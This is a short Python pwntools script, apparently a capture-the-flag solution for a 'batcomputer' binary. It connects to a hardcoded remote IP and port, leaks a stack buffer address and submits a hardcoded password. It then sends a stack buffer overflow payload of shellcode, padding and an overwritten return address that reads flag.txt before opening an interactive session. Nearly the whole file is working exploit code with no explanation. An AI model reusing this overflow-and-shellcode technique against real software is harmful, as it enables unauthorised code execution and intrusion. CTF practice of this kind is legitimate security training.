#46.101.91.21:30914
#"b4tp@$$w0rd!"

from pwn import *

context.arch = 'x86_64'

BATPASSWORD = 'b4tp@$$w0rd!'

# p = process('./batcomputer')
p = remote('46.101.91.21', 30914)
prompt = p.recv()
p.sendline('1')
response = p.recv()

print(response)
bufferAddressHex = response.decode('latin-1').split('\n')[0].split(' ')[-1]
shellcode = shellcraft.amd64.linux.cat('flag.txt')

p.sendline('2')
p.sendline(BATPASSWORD)

payload = asm(shellcode)

#ebp is offset 76
#so eip return must be offset 84
retOffset = 84
padding = retOffset - len(payload)
payload += ('a' * padding).encode('latin-1')
payload += p64(int(bufferAddressHex, 0))

p.sendline(payload)

print(p.recv())
p.sendline('3')
print(p.recv())
p.interactive()
